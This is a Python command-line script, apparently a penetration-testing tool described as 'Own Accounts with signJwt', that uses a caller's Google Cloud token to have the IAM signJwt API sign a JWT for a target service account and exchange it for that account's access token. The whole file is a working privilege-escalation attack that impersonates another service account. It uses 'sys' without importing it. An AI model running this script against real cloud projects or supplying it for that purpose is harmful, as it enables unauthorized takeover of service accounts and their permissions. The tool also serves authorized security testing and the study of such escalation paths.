#!/usr/bin/env python3

import requests
from google.oauth2 import service_account
import json
from datetime import datetime, timedelta
import google.auth.transport.requests
import argparse


def getTokenFromKeyFile(file_name):
    scopes = ["https://www.googleapis.com/auth/cloud-platform"]
    creds = service_account.Credentials.from_service_account_file(file_name, scopes=scopes)
    auth_req = google.auth.transport.requests.Request()
    creds.refresh(auth_req)
    return creds.token

def getJwt(service_account_email, token):
    now = int(datetime.now().timestamp())
    payload = {
            "iss":service_account_email,
            "sub":service_account_email,
            "scope":"https://www.googleapis.com/auth/cloud-platform",
            "aud":"https://oauth2.googleapis.com/token",
            "iat": now,
            "exp": now + 3600
            }

    body = {
            "payload": json.dumps(payload)
            }
    headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type":"Application/json"
            }

    signJwt_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{service_account_email}:signJwt"

    r = requests.post(signJwt_url, json=body, headers=headers)
    if r.status_code == 200:
        signedJwt = r.json()['signedJwt']
        return signedJwt
    else:
        print(f"[!] Signing Request failed (Status {r.status_code}): {r.text}")
        sys.exit(1)


def getAccessToken(service_account_email, token):
    assertion = getJwt(service_account_email, token)
    grant_type = "urn:ietf:params:oauth:grant-type:jwt-bearer"

    headers = {
            "Content-Type": "application/x-www-form-urlencoded"
            }
    body = {
            "assertion": assertion,
            "grant_type": grant_type
            }
    token_url = "https://oauth2.googleapis.com/token"
    r = requests.post(token_url, data=body, headers=headers)
    if r.status_code == 200:
        return r.json()


def main():
    parser = argparse.ArgumentParser(
            description="Own Accounts with signJwt"
            )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--token", help="Caller's Access Token String")
    group.add_argument("-f", "--token-file", help="Path to file containg Access Token")
    group.add_argument("-k", "--key-file", help="Path to Service Account JSON key file")
    parser.add_argument("-s", "--target-account", help="Target Service Account Email", required=True)

    args = parser.parse_args()

    token = None
    if args.token:
        token = args.token
    elif args.token_file:
        with open(args.token_file, 'r') as f:
            token = f.read().strip()
    elif args.key_file:
        token = getTokenFromKeyFile(args.key_file)

    if not token:
        print("[!] Could not retrieve a valid caller token")
        sys.exit(1)

    service_account_email = None
    if args.target_account:
        service_account_email = args.target_account
    
    try:
        print("[*] Getting Access Token")
        access_token = getAccessToken(service_account_email, token)
        if access_token:
            print(f"[*] Successfully retrieved access_token for {service_account_email}")
            print(json.dumps(access_token, indent=2))
    except Exception as e:
        print(f"[!] An error occured while retrieving access_token for {service_account_email}")

if __name__ == "__main__":
    main()
